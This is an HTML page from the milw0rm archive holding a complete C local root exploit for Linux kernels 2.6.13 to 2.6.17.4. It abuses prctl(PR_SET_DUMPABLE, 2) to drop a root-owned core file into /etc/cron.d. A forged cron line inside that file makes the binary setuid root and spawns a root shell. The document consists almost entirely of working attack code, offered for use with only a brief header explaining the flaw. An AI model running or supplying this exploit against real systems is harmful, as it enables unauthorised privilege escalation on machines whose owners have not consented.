<html><head><title>Linux Kernel 2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (2)</title></head><pre>/* Linux &gt;= 2.6.13 prctl kernel exploit
 *
 * (C) Julien TINNES
 *
 * If you read the Changelog from 2.6.13 you've probably seen:
 *  [PATCH] setuid core dump
 * 
 * This patch mainly adds suidsafe to suid_dumpable sysctl but also a new per process,
 * user setable argument to PR_SET_DUMPABLE.
 * 
 * This flaw allows us to create a root owned coredump into any directory.
 * This is trivially exploitable.
 *
 */

#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/resource.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;time.h&gt;

#define CROND &quot;/etc/cron.d&quot;
#define BUFSIZE 2048


struct rlimit myrlimit={RLIM_INFINITY, RLIM_INFINITY};

char	crontemplate[]=
&quot;#/etc/cron.d/core suid_dumpable exploit\n&quot;
&quot;SHELL=/bin/sh\n&quot;
&quot;PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n&quot;
&quot;#%s* * * * *	root	 chown root:root %s &amp;&amp; chmod 4755 %s &amp;&amp; rm -rf %s &amp;&amp; kill -USR1 %d\n&quot;;

char	cronstring[BUFSIZE];
char	fname[BUFSIZE];

struct timeval te;

void sh(int sn) {
	execl(fname, fname, (char *) NULL);
}
	

int	main(int argc, char *argv[]) {

	int nw, pid;

	if (geteuid() == 0) {
		printf(&quot;[+] getting root shell\n&quot;);
		setuid(0);
		setgid(0);
		if (execl(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, (char *) NULL)) {
			perror(&quot;[-] execle&quot;);
			return 1;
		}
	}

	printf(&quot;\nprctl() suidsafe exploit\n\n(C) Julien TINNES\n\n&quot;);

	/* get our file name */
	if (readlink(&quot;/proc/self/exe&quot;, fname, sizeof(fname)) == -1) {
		perror(&quot;[-] readlink&quot;);
		printf(&quot;This is not fatal, rewrite the exploit\n&quot;);
	}

	if (signal(SIGUSR1, sh) == SIG_ERR) {
		perror(&quot;[-] signal&quot;);
		return 1;
	}
	printf(&quot;[+] Installed signal handler\n&quot;);

	/* Let us create core files */
	setrlimit(RLIMIT_CORE, &amp;myrlimit);
	if (chdir(CROND) == -1) {
		perror(&quot;[-] chdir&quot;);
		return 1;
	}

	/* exploit the flaw */
	if (prctl(PR_SET_DUMPABLE, 2) == -1) {
		perror(&quot;[-] prtctl&quot;);
		printf(&quot;Is you kernel version &gt;= 2.6.13 ?\n&quot;);
		return 1;
	}

	printf(&quot;[+] We are suidsafe dumpable!\n&quot;);

	/* Forge the string for our core dump */
	nw=snprintf(cronstring, sizeof(cronstring), crontemplate, &quot;\n&quot;, fname, fname, CROND&quot;/core&quot;, getpid());
	if (nw &gt;= sizeof(cronstring)) {
		printf(&quot;[-] cronstring is too small\n&quot;);
		return 1;
	}
	printf(&quot;[+] Malicious string forged\n&quot;);

	if ((pid=fork()) == -1) {
		perror(&quot;[-] fork&quot;);
		return 1;
	}

	if (pid == 0) {
		/* This is not the good way to do it ;) */
		sleep(120);
		exit(0);
	}

	/* SEGFAULT the child */
	printf(&quot;[+] Segfaulting child\n&quot;);
	if (kill(pid, 11) == -1) {
		perror(&quot;[-] kill&quot;);
		return 1;
	}
	if (gettimeofday(&amp;te, NULL) == 0) 
		printf(&quot;[+] Waiting for exploit to succeed (~%ld seconds)\n&quot;, 60 - (te.tv_sec%60));
	sleep(120);

	printf(&quot;[-] It looks like the exploit failed\n&quot;);

	return 1;
}

// milw0rm.com [2006-07-12]</pre></html>